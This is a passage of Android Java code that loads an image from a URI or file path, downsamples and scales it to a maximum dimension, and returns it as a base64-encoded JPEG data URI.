                    isBounds = getContext().getContentResolver().openInputStream(uri);
                }
            } catch (Throwable ignored) {}

            if (isBounds == null && filePath != null) {
                File f = new File(filePath);
                if (f.exists()) isBounds = new FileInputStream(f);
            }

            if (isBounds != null) {
                try {
                    BitmapFactory.decodeStream(isBounds, null, boundsOptions);
                } finally {
                    isBounds.close();
                }
            }

            int origWidth = boundsOptions.outWidth;
            int origHeight = boundsOptions.outHeight;
            int inSampleSize = 1;

            // Retain full crisp resolution up to 2560px safe device limit
            int targetMax = maxDim > 0 ? maxDim : 2560;

            if (origWidth > targetMax || origHeight > targetMax) {
                int halfWidth = origWidth / 2;
                int halfHeight = origHeight / 2;
                while ((halfWidth / inSampleSize) >= targetMax && (halfHeight / inSampleSize) >= targetMax) {
                    inSampleSize *= 2;
                }
            }

            BitmapFactory.Options decodeOptions = new BitmapFactory.Options();
            decodeOptions.inSampleSize = inSampleSize;
            decodeOptions.inPreferredConfig = Bitmap.Config.ARGB_8888;

            InputStream isDecode = null;
            try {
                if (uri != null) {
                    isDecode = getContext().getContentResolver().openInputStream(uri);
                }
            } catch (Throwable ignored) {}

            if (isDecode == null && filePath != null) {
                File f = new File(filePath);
                if (f.exists()) isDecode = new FileInputStream(f);
            }

            if (isDecode != null) {
                Bitmap bmp = null;
                try {
                    bmp = BitmapFactory.decodeStream(isDecode, null, decodeOptions);
                } finally {
                    isDecode.close();
                }

                if (bmp != null) {
                    if (targetMax > 0 && (bmp.getWidth() > targetMax || bmp.getHeight() > targetMax)) {
                        float ratio = Math.min((float) targetMax / bmp.getWidth(), (float) targetMax / bmp.getHeight());
                        int width = Math.max(1, Math.round(ratio * bmp.getWidth()));
                        int height = Math.max(1, Math.round(ratio * bmp.getHeight()));
                        Bitmap scaled = Bitmap.createScaledBitmap(bmp, width, height, true);
                        if (scaled != bmp) {
                            bmp.recycle();
                            bmp = scaled;
                        }
                    }

                    int q = (quality >= 1 && quality <= 100) ? quality : 92;
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bmp.compress(Bitmap.CompressFormat.JPEG, q, baos);
                    byte[] bytes = baos.toByteArray();
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    bmp.recycle();
                    return "data:image/jpeg;base64," + b64;
                }
            }
        } catch (Throwable e) {
            // Failed decoding
        }
        return null;
    }
}
